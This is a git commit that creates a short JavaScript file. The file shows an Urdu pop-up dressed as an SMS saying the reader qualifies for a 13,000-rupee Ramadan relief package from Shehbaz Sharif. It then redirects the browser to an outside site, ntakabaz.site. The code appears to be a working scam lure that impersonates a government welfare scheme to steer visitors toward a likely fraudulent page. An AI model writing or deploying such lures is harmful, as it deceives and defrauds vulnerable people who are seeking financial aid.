316f7fefcef8365a5abd8cff0379836b0b372063
usorondo17 <acre-poodles.8y@icloud.com>
2026-02-22 02:05:34 +0100

    Create ramreleif.js

---
+++ ramreleif.js
@@ -0,0 +1,5 @@
+var password = '13,000 روپے نکال لیں۔'
+password=prompt('SMS: مبارک ہو، آپ شہباز شریف سے 13,000 روپے کا رمضان ریلیف پیکج وصول کرنے کے اہل ہیں... Cah واپس لینے کے لیے Ok پر کلک کریں','13,000 روپے نکال لیں۔');
+if (password != '13,000 روپے نکال لیں۔') {
+location.href='https://www.ntakabaz.site/ramadan-releif';
+}
